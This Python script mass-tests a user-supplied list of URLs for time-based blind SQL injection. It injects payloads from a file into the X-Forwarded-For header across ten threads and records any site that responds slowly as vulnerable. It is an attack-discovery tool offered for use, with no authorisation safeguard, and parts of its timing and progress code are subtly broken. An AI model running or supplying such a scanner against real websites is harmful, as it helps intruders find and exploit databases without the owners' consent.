#!/usr/bin/env python3
import re
import subprocess
import time
from tqdm import tqdm
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor

# Ask for path of file containing URLs to test
urls_file = input(colored("Enter path of file containing URLs to test (one URL per line): ", 'blue'))
with open(urls_file) as f:
    urls = [line.strip() for line in f.readlines()]

# Ask for path of file containing payloads to test in X-Forwarded-For header
payloads_file = input(colored("Enter path of file containing payloads to test in X-Forwarded-For header: ", 'blue'))
with open(payloads_file) as f:
    payloads = [line.strip() for line in f.readlines()]

# Define regex pattern to extract elapsed time from curl output
time_pattern = re.compile(r"elapsed (\d+:\d+\.\d+)")

total_requests = len(urls) * len(payloads)
progress = 0
start_time = time.time()

# Initialize the list of vulnerable URLs and payloads
vulnerable_urls = []
vulnerable_payloads = {}

# Function to send curl requests
def send_request(url, payload):
    global progress
    url = url.strip()
    payload = payload.strip()
    print(f"Sending request to {url} with payload '{payload}'...")

    # Send curl request with payload in X-Forwarded-For header
    start_time = time.monotonic()
    try:
        output = subprocess.check_output(["time", "curl", "-s", "-H", f"X-Forwarded-For: {payload}", url], stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        print(f"Error accessing {url}: {e.output.decode()}")
        return

    end_time = time.monotonic()

    # Extract elapsed time from curl output
    match = time_pattern.search(output.decode(errors='replace'))
    if match:
        elapsed_time = match.group(1)
    else:
        elapsed_time = "not-vuln"

    # Check if elapsed time is greater than or equal to 15 seconds
    if end_time - start_time >= 15:
        if url not in vulnerable_urls:
            vulnerable_urls.append(url)
            vulnerable_payloads[url] = []
        vulnerable_payloads[url].append(payload)
        message = f"\n{colored('TIME BASED SQL FOUND ON X-Forwarded-For', 'white')} {colored(url, 'red')} with header payload {colored(payload, 'red')}"
        print(message)

    # Check if elapsed time is less than 15 seconds
    else:
        print(colored(f"{url}: safe with header payload {payload} (safe: {elapsed_time})", 'green'))

    # Update progress and calculate estimated remaining time
    progress += 1
    elapsed_seconds = time.time() - start_time
    remaining_seconds = (total_requests - progress) * (elapsed_seconds / progress)
    remaining_hours = int(remaining_seconds // 3600)
    remaining_minutes = int((remaining_seconds % 3600) // 60)
    percent_complete = round(progress / total_requests * 100, 2)

    # Print progress update
    print(f"{colored('Progress:', 'blue')} {progress}/{total_requests} ({percent_complete}%) - {remaining_hours}h:{remaining_minutes:02d}m - Elapsed time: {round(end_time - start_time, 2)}s")

    # Delay for 0.5 second before sending the next request
    time.sleep(0.5)

# Use ThreadPoolExecutor for multithreading with 10 workers
with ThreadPoolExecutor(max_workers=10) as executor:
    for url in urls:
        for payload in payloads:
            executor.submit(send_request, url, payload)

# Write the vulnerable URLs and payloads to file
if vulnerable_urls:
    with open("vulnerable_xforwardforURLS.txt", "w") as f:
        for url in vulnerable_urls:
            f.write(f"{url}\n")
            if url in vulnerable_payloads:
                f.write(f"Payloads: {', '.join(vulnerable_payloads[url])}\n")
        print(f"Successfully wrote {len(vulnerable_urls)} vulnerable URLs to 'vulnerable_xforwardforURLS.txt'")
else:
    print("No URLs found with elapsed time greater than or equal to 15 seconds.")
